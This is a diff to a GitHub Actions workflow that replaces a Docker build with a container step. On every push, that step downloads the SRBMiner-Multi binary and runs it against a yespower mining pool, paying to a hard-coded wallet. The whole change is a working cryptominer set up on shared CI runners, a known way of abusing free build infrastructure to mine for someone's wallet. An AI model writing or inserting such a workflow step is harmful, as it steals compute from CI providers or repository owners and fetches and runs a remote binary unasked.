@@ -1,4 +1,4 @@
-name: Build and Run SRBMiner Container
+name: Run SRBMiner Multi Without Dockerfile
 
 on:
   push:
@@ -6,20 +6,18 @@ on:
   workflow_dispatch:
 
 jobs:
-  build-and-run:
+  run-srbminer:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v3
-
-      - name: Build Docker Image
+      - name: Run SRBMiner Multi Container
         run: |
-          docker build -t srbminer .
-
-      - name: Run Docker Container
-        run: |
-          # Run the container in detached mode and map port 80 in the container to 8080 on the host
-          docker run -d -p 8080:80 --name srbminer_container srbminer
-
+          docker run -d -p 8080:80 --name srbminer_container public.ecr.aws/lts/ubuntu:latest bash -c "\
+            apt update && \
+            apt -y install wget tar xz-utils && \
+            wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.5/SRBMiner-Multi-2-4-5-Linux.tar.xz && \
+            tar -xf SRBMiner-Multi-2-4-5-Linux.tar.xz && \
+            cd SRBMiner-Multi-2-4-5 && \
+            chmod +x SRBMiner-MULTI && \
+            ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool pool.viporlab.net:16004 --wallet v38ioPMpp4jmKPjssPbdGygKLK9hFkvyXk.Hopx1D pause --keepalive true"
       - name: List Running Containers
         run: docker ps
